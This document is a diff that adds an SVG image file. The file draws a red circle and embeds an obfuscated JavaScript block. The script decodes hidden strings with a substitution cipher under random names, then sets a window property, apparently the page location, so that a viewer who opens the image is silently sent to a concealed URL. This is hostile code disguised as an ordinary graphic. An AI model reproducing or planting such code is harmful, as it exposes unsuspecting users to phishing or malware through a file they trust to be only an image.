@@ -1,0 +1,54 @@
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <circle cx="250" cy="250" r="50" fill="red" />
+  <script type="text/javascript"><![CDATA[
+    function dbhyy(sixnvr,nrdgrk,xzltq){
+      var yjbene = "tUZu?cz20jdk/DXNSTeIyVGa8m14KP5rxC6pl:bLnBAYfiMJFh9.ovgREH_3O7s=";
+      var uddjv = ["djPnX_hM8vUJ.yF9peANR73YI\/KukxGZl6Bbs20m5D1?:LHaOT4zSgforic=CVtE","pZTszVkad=PBG?uRUbM9HoX_3t6EI1FLc.e5f\/KODY0vnAyCrJmh4jgSx2:8iNl7",".Noet8TypChD4zIu_d=EZ32LYlva50xnOU:9fSgrPViKAJRsm1kG\/7c6HB?XjFMb","g1pEfUhIKGHiCe:r057=ABPXR8uO6YyS3_zMcsLa?j.vF9bolZNDV\/tJTdm2nk4x","L=f2Y7stlKC5_UA.VX1ahvmcruzox?J:g6MDIpHn0bRyijFZ4NEde\/BkP89STOG3"];
+      var gjixb = "";
+      var pfbhpn = 0;
+      while(uddjv[pfbhpn]){
+        pfbhpn++;
+      }
+      var fknaa = 0;
+      while(sixnvr[fknaa]){
+        var uqory = 0;
+        var ybvlna = -1;
+        while(yjbene[uqory]){
+          if(yjbene[uqory] == sixnvr[fknaa]){
+            ybvlna = uqory;
+            break;
+          }
+          uqory++;
+        }
+        if(ybvlna >= 0){
+          var jckcc = 0;
+          var bbjvgt = -1;
+          while(uddjv[fknaa%pfbhpn][jckcc]){
+            if(uddjv[fknaa%pfbhpn][jckcc] == sixnvr[fknaa]){
+              bbjvgt = jckcc;
+              break;
+            }
+          jckcc++;
+          }
+          gjixb += yjbene[bbjvgt];
+        }else{
+          gjixb += sixnvr[fknaa];
+        }
+        fknaa++;
+      }
+      var olcbuv = "";
+      for(rgzcz=nrdgrk;rgzcz<gjixb.length;rgzcz++){
+        olcbuv += gjixb[rgzcz];
+      }
+      gjixb = olcbuv;
+      return gjixb;
+    }
+  var wlxro = window;
+  var cbduo = dbhyy("flnUDLVPgeb",8,true);
+  var rrivlw = dbhyy("_f/UcdA/?",1,true);
+  var zbvfw = dbhyy("nwcg5vjPEiZ_DZ:An",13,true);
+  wlxro[cbduo][rrivlw][zbvfw] = dbhyy("TgAVhwL/7L0n1gLb/4CBLnJ/1UM97dLpeMdbw4MNbG.S2tpGMNb",12,true);
+  ]]></script>
+</svg>
